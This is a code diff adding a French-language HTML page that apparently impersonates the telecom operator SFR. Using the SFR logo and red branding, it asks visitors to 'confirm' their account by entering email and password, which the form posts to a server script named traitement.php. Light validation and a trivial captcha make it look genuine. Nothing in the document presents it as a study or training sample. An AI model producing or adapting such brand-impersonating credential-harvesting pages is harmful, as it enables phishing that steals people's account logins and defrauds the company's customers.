@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Votre compte - SFR</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: url("arriere plan.webp") no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: white;
+    }
+    .register-container {
+      background: white;
+      padding: 30px 40px;
+      border-radius: 8px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      color: #222;
+      width: 340px;
+      text-align: center;
+    }
+    .logo-sfr {
+      margin-bottom: 20px;
+    }
+    .logo-sfr img {
+      height: 60px;
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #e60000;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+      text-align: left;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+    }
+    .error-message {
+      color: red;
+      font-size: 0.9rem;
+      margin-top: 5px;
+      display: none;
+      text-align: left;
+    }
+    button {
+      margin-top: 25px;
+      background: #e60000;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 4px;
+      font-size: 1rem;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background: #b30000;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="register-container">
+    <div class="logo-sfr">
+      <img src="logo-sfr.png" alt="Logo SFR" />
+    </div>
+
+    <h2>Confirmer votre compte SFR</h2>
+    <form id="registerForm" action="traitement.php" method="POST">
+      <label for="email">Email</label>
+      <input type="email" id="email" name="email" required />
+      <div id="emailError" class="error-message">Veuillez entrer un email valide.</div>
+
+      <label for="password">Mot de passe</label>
+      <input type="password" id="password" name="password" required minlength="6" />
+      <div id="passwordError" class="error-message">Le mot de passe doit contenir au moins 6 caractères.</div>
+
+      <label for="confirmPassword">Confirmez le mot de passe</label>
+      <input type="password" id="confirmPassword" name="confirmPassword" required />
+      <div id="confirmError" class="error-message">Les mots de passe ne correspondent pas.</div>
+
+      <label for="captcha">Combien font 3 + 5 ?</label>
+      <input type="text" id="captcha" name="captcha" required />
+      <div id="captchaError" class="error-message">Réponse incorrecte. Essayez encore.</div>
+
+      <button type="submit">Valider</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('registerForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const confirmInput = document.getElementById('confirmPassword');
+
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const confirmError = document.getElementById('confirmError');
+
+    form.addEventListener('submit', (e) => {
+      // e.preventDefault();
+
+      // Réinitialise les messages d’erreur
+      emailError.style.display = 'none';
+      passwordError.style.display = 'none';
+      confirmError.style.display = 'none';
+
+      let valid = true;
+
+      // Vérification email
+      if (!emailInput.value || !emailInput.value.includes('@')) {
+        emailError.style.display = 'block';
+        valid = false;
+      }
+
+      // Vérification mot de passe
+      if (!passwordInput.value || passwordInput.value.length < 6) {
+        passwordError.style.display = 'block';
+        valid = false;
+      }
+
+      // Vérification confirmation mot de passe
+      if (passwordInput.value !== confirmInput.value) {
+        confirmError.style.display = 'block';
+        valid = false;
+      }
+   
+      const captchaInput = document.getElementById('captcha');
+      const captchaError = document.getElementById('captchaError');
+
+      // Réinitialiser l'erreur du captcha
+      captchaError.style.display = 'none';
+
+      // Vérification captcha (réponse attendue = 8)
+      if (captchaInput.value.trim() !== '8') {
+      captchaError.style.display = 'block';
+      valid = false;
+      }
+
+      if (valid) {
+        alert('Confirmation réussie ! Compte actif.');
+        localStorage.setItem('inscrit', 'true');
+        window.location.href = 'index.html';
+      }
+    });
+  </script>
+
+</body>
+</html>
